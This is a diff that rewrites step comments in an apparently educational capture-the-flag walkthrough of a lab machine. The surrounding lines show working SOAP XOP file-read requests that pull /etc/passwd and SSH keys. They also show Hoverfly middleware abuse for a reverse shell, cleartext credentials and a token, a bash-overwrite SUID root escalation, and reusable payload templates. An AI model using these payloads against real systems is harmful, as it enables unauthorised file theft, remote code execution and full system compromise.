@@ -49,15 +49,15 @@ Root Shell → Root Flag
 
 ### Host Setup
 ```bash
-# What it does: adds machine domains to /etc/hosts.
-# Why here: resolve virtual hosts during web enumeration.
+# What it does: add the target IP and devarea.htb to the local hosts file.
+# Why here: enable domain-based resolution for the vhost-dependent web services.
 echo "TARGET_IP devarea.htb" | sudo tee -a /etc/hosts
 ```
 
 ### Nmap Scan
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: scan all TCP ports with service and script discovery.
+# Why here: identify the attack surface, including the CXF service and Hoverfly instances.
 nmap -sC -sV -p- TARGET_IP
 ```
 
@@ -77,8 +77,8 @@ Port 80 hosts a CTF platform, but the real entry point is the **Apache CXF SOAP 
 
 ```bash
 # Test CXF service endpoint
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: request the WSDL file from the SOAP service.
+# Why here: inspect the available SOAP operations and service structure.
 curl -s http://devarea.htb:8080/employeeservice?wsdl
 ```
 
@@ -101,8 +101,8 @@ curl -s http://devarea.htb:8080/employeeservice?wsdl
 ### Step 1 — Read /etc/passwd
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send a crafted SOAP request with an XOP Include payload.
+# Why here: exploit CVE-2022-46364 to read /etc/passwd and enumerate system users.
 curl -s -X POST http://devarea.htb:8080/employeeservice \
   -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<rootpart@soapui.org>"; start-info="text/xml"; boundary="MIMEBoundary"' \
   --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <rootpart@soapui.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n  <soapenv:Body>\r\n    <dev:submitReport>\r\n      <arg0>\r\n        <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></employeeName>\r\n        <department>x</department>\r\n        <content>x</content>\r\n        <confidential>false</confidential>\r\n      </arg0>\r\n    </dev:submitReport>\r\n  </soapenv:Body>\r\n</soapenv:Envelope>\r\n--MIMEBoundary--\r\n'
@@ -111,8 +111,8 @@ curl -s -X POST http://devarea.htb:8080/employeeservice \
 **Response:** The service returns a **base64-encoded** version of `/etc/passwd`. Decode it:
 
 ```bash
-# What it does: decodes or encodes Base64 data.
-# Why here: convertir loot codificado en texto utilizable.
+# What it does: decode the base64-encoded output.
+# Why here: convert the leaked file content into a readable format.
 echo "<base64_output>" | base64 -d
 ```
 
@@ -129,8 +129,8 @@ hoverfly:x:1002:1002::/opt/HoverFly:/bin/false
 
 ```bash
 # Read SSH keys
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: attempt to read dev_ryan's private SSH key.
+# Why here: check for potential SSH-based lateral movement opportunities.
 curl -s -X POST http://devarea.htb:8080/employeeservice \
   -H 'Content-Type: multipart/related; ...' \
   --data-binary $'...<xop:Include href="file:///home/dev_ryan/.ssh/id_rsa"/>...'
@@ -150,8 +150,8 @@ curl -s -X POST http://devarea.htb:8080/employeeservice \
 The Hoverfly service configuration often contains command-line arguments with embedded credentials.
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: request the hoverfly.service unit file.
+# Why here: check the service definition for credentials or sensitive configuration flags.
 curl -s -X POST http://devarea.htb:8080/employeeservice \
   -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<rootpart@soapui.org>"; start-info="text/xml"; boundary="MIMEBoundary"' \
   --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <rootpart@soapui.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n  <soapenv:Body>\r\n    <dev:submitReport>\r\n      <arg0>\r\n        <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/systemd/system/hoverfly.service"/></employeeName>\r\n        <department>x</department>\r\n        <content>x</content>\r\n        <confidential>false</confidential>\r\n      </arg0>\r\n    </dev:submitReport>\r\n  </soapenv:Body>\r\n</soapenv:Envelope>\r\n--MIMEBoundary--\r\n'
@@ -159,8 +159,8 @@ curl -s -X POST http://devarea.htb:8080/employeeservice \
 
 **Decode the base64 response:**
 ```bash
-# What it does: decodes or encodes Base64 data.
-# Why here: convertir loot codificado en texto utilizable.
+# What it does: decode the base64-encoded output.
+# Why here: convert the leaked file content into a readable format.
 echo "<base64_output>" | base64 -d
 ```
 
@@ -200,8 +200,8 @@ Hoverfly is an open-source **API simulation tool** that acts as a proxy to captu
 ### Step 1 — Obtain JWT Token
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: authenticate to the Hoverfly API.
+# Why here: obtain a JWT token required for privileged middleware configuration.
 curl -X POST http://devarea.htb:8888/api/token-auth \
   -H "Content-Type: application/json" \
   -d '{"username":"admin","password":"O7IJ27MyyXiU"}'
@@ -218,8 +218,8 @@ curl -X POST http://devarea.htb:8888/api/token-auth \
 
 **1. Set up listener:**
 ```bash
-# What it does: opens or uses a TCP connection/listener.
-# Why here: receive shell, transfer data or check connectivity.
+# What it does: start a netcat listener on port 4444.
+# Why here: catch the incoming reverse shell from the Hoverfly middleware script.
 nc -lvnp 4444
 ```
 
@@ -227,8 +227,8 @@ nc -lvnp 4444
 ```bash
 TOKEN="eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODYxNzI2MDMsImlhdCI6MTc3NTEzMjYwMywic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.p_ynLww4e0usCz88fQnbWRl1qBf96zZtghHv9HVAsmpKlggm_b0Q61D8LrV_VZE-qh-18_aTUBv1ueJ-gwTy_A"
 
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: upload a malicious bash script to the Hoverfly middleware API.
+# Why here: exploit CVE-2024-45388 to achieve RCE when a request is proxied.
 curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
@@ -247,8 +247,8 @@ curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
 The middleware executes when a request passes through the Hoverfly proxy (port 8500):
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send a request through the Hoverfly proxy.
+# Why here: trigger the execution of the configured middleware script to spawn the shell.
 curl -x http://devarea.htb:8500 http://example.com
 ```
 
@@ -284,8 +284,8 @@ id
 # uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
 
 # Check sudo permissions
-# What it does: lists sudo privileges of the current or specified user.
-# Why here: encontrar comandos permitidos para escalar privilegios.
+# What it does: list the sudo permissions for dev_ryan.
+# Why here: identify the syswatch.sh script as a potential privilege escalation vector.
 sudo -l
 ```
 
@@ -320,8 +320,8 @@ The `/opt/syswatch/syswatch.sh` script calls `bash` without specifying the **abs
 ```bash
 # The script likely does something like:
 #!/bin/bash
-# What it does: imprime o escribe texto controlado.
-# Why here: crear la entrada o archivo pequeno necesario para el siguiente paso.
+# What it does: simulate the behavior of the syswatch.sh script.
+# Why here: illustrate the relative path vulnerability that enables the bash hijack.
 echo "System Watcher Version 1.0"
 bash -c "some_command"   # ← Calls 'bash' without absolute path
 ```
@@ -335,11 +335,11 @@ bash -c "some_command"   # ← Calls 'bash' without absolute path
 ### Step 1 — Backup Real Bash
 
 ```bash
-# What it does: copies or moves a file.
-# Why here: prepare payloads or place loot where the next command expects it.
+# What it does: backup the real bash binary.
+# Why here: ensure we can restore the system after the hijack.
 cp /usr/bin/bash /tmp/bash.bak
-# What it does: changes permissions or owner.
-# Why here: make a payload executable or control access to a file.
+# What it does: ensure the backup binary is executable.
+# Why here: the shebang in our fake bash will point to this backup.
 chmod +x /tmp/bash.bak
 ```
 
@@ -363,8 +363,8 @@ lsof /usr/bin/bash
 ### Step 3 — Overwrite /usr/bin/bash with Malicious Script
 
 ```bash
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: replace the real bash with a malicious SUID-creating script.
+# Why here: leverage the sudo-run syswatch.sh to execute this script as root.
 cat > /usr/bin/bash << 'EOF'
 #!/tmp/bash.bak
 # What it does: copies or moves a file.
@@ -388,16 +388,16 @@ chmod +x /usr/bin/bash
 ### Step 4 — Trigger Syswatch
 
 ```bash
-# What it does: ejecuta un comando permitido por sudo con ruta absoluta.
-# Why here: disparar la primitiva de privesc encontrada con sudo -l.
+# What it does: execute the vulnerable script with sudo.
+# Why here: trigger the bash hijack to create the /tmp/rootbash SUID binary.
 sudo /opt/syswatch/syswatch.sh --version
 ```
 
 The script executes our fake `bash` as root, creating the SUID binary:
 
 ```bash
-# What it does: lists directory contents.
-# Why here: verificar archivos, permisos o loot en la ruta actual.
+# What it does: verify the creation and permissions of the rootbash binary.
+# Why here: confirm that the SUID bit is correctly set before attempting execution.
 ls -la /tmp/rootbash
 # -rwsr-xr-x 1 root root 1446024 Apr  2 12:43 /tmp/rootbash
 ```
@@ -408,8 +408,8 @@ ls -la /tmp/rootbash
 
 ```bash
 /tmp/rootbash -p
-# What it does: executes a Windows command line action.
-# Why here: enumerate, transfer, replace or validate artifacts on the victim.
+# What it does: execute the SUID root shell with the privileged flag.
+# Why here: drop into a full root shell to complete the compromise.
 whoami
 # root
 ```
@@ -434,11 +434,11 @@ root@devarea:~# cat /root/root.txt
 
 If `/opt/syswatch/syswatch.sh` is writable:
 ```bash
-# What it does: escribe un comando payload en un archivo o entrada vulnerable.
-# Why here: convertir script/ruta escribible en ejecucion de codigo.
+# What it does: append a malicious command directly to the script.
+# Why here: alternative method if the script itself is writable by dev_ryan.
 echo "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash" >> /opt/syswatch/syswatch.sh
-# What it does: ejecuta un comando permitido por sudo con ruta absoluta.
-# Why here: disparar la primitiva de privesc encontrada con sudo -l.
+# What it does: execute the vulnerable script with sudo.
+# Why here: trigger the privilege escalation primitive identified earlier.
 sudo /opt/syswatch/syswatch.sh --version
 ```
 
@@ -458,8 +458,8 @@ chmod +x /tmp/cp
 export PATH=/tmp:$PATH
 
 # Execute syswatch
-# What it does: ejecuta un comando permitido por sudo con ruta absoluta.
-# Why here: disparar la primitiva de privesc encontrada con sudo -l.
+# What it does: execute the vulnerable script with sudo.
+# Why here: trigger the privilege escalation primitive identified earlier.
 sudo /opt/syswatch/syswatch.sh --version
 ```
 
@@ -493,8 +493,8 @@ sudo /opt/syswatch/syswatch.sh --version
 ### SOAP Request Template
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target service.
+# Why here: interact with the application logic or trigger a specific vulnerability.
 curl -s -X POST http://TARGET:8080/employeeservice \
   -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<rootpart@soapui.org>"; start-info="text/xml"; boundary="MIMEBoundary"' \
   --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <rootpart@soapui.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n  <soapenv:Body>\r\n    <dev:submitReport>\r\n      <arg0>\r\n        <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///TARGET_FILE"/></employeeName>\r\n        <department>x</department>\r\n        <content>x</content>\r\n        <confidential>false</confidential>\r\n      </arg0>\r\n    </dev:submitReport>\r\n  </soapenv:Body>\r\n</soapenv:Envelope>\r\n--MIMEBoundary--\r\n'
@@ -519,8 +519,8 @@ curl -s -X POST http://TARGET:8080/employeeservice \
 
 ```bash
 # Obtain JWT token
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target service.
+# Why here: interact with the application logic or trigger a specific vulnerability.
 curl -X POST http://TARGET:8888/api/token-auth \
   -H "Content-Type: application/json" \
   -d '{"username":"admin","password":"PASSWORD"}'
@@ -531,8 +531,8 @@ curl -X POST http://TARGET:8888/api/token-auth \
 ```bash
 # Set reverse shell middleware
 TOKEN="<JWT_TOKEN>"
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target service.
+# Why here: interact with the application logic or trigger a specific vulnerability.
 curl -s -X PUT http://TARGET:8888/api/v2/hoverfly/middleware \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
@@ -550,8 +550,8 @@ curl -x http://TARGET:8500 http://example.com
 
 ```bash
 # Check for SUID binaries
-# What it does: searches the filesystem with the specified filters.
-# Why here: locate credentials, binaries, configs or writable paths.
+# What it does: search for binaries with the SUID bit set.
+# Why here: identify potential privilege escalation vectors on the filesystem.
 find / -perm -4000 -type f 2>/dev/null
 
 # SUID permission breakdown
@@ -565,8 +565,8 @@ find / -perm -4000 -type f 2>/dev/null
 
 ```bash
 # Find SUID binaries
-# What it does: searches the filesystem with the specified filters.
-# Why here: locate credentials, binaries, configs or writable paths.
+# What it does: search for binaries with the SUID bit set.
+# Why here: identify potential privilege escalation vectors on the filesystem.
 find / -perm -4000 -type f 2>/dev/null
 
 # Exploit common SUID binaries
@@ -574,11 +574,11 @@ find / -perm -4000 -type f -name "bash" 2>/dev/null
 find / -perm -4000 -type f -name "sh" 2>/dev/null
 
 # Create SUID root shell
-# What it does: copies or moves a file.
-# Why here: prepare payloads or place loot where the next command expects it.
+# What it does: copy a binary or file to a temporary location.
+# Why here: prepare a payload or stage a binary for privilege escalation.
 cp /bin/bash /tmp/rootbash
-# What it does: changes permissions or owner.
-# Why here: make a payload executable or control access to a file.
+# What it does: set executable or SUID permissions.
+# Why here: ensure the payload can be executed with the necessary privileges.
 chmod 4755 /tmp/rootbash
 /tmp/rootbash -p
 ```
@@ -587,8 +587,8 @@ chmod 4755 /tmp/rootbash
 
 ```bash
 # 1. Backup real bash
-# What it does: copies or moves a file.
-# Why here: prepare payloads or place loot where the next command expects it.
+# What it does: copy a binary or file to a temporary location.
+# Why here: prepare a payload or stage a binary for privilege escalation.
 cp /usr/bin/bash /tmp/bash.bak
 
 # 2. Switch to sh, kill bash processes
@@ -597,15 +597,15 @@ pkill -9 bash
 lsof /usr/bin/bash
 
 # 3. Overwrite with malicious script
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: replace the real bash with a malicious SUID-creating script.
+# Why here: leverage the sudo-run syswatch.sh to execute this script as root.
 cat > /usr/bin/bash << 'EOF'
 #!/tmp/bash.bak
-# What it does: copies or moves a file.
-# Why here: prepare payloads or place loot where the next command expects it.
+# What it does: copy a binary or file to a temporary location.
+# Why here: prepare a payload or stage a binary for privilege escalation.
 cp /tmp/bash.bak /tmp/rootbash
-# What it does: changes permissions or owner.
-# Why here: make a payload executable or control access to a file.
+# What it does: set executable or SUID permissions.
+# Why here: ensure the payload can be executed with the necessary privileges.
 chmod 4755 /tmp/rootbash
 EOF
 
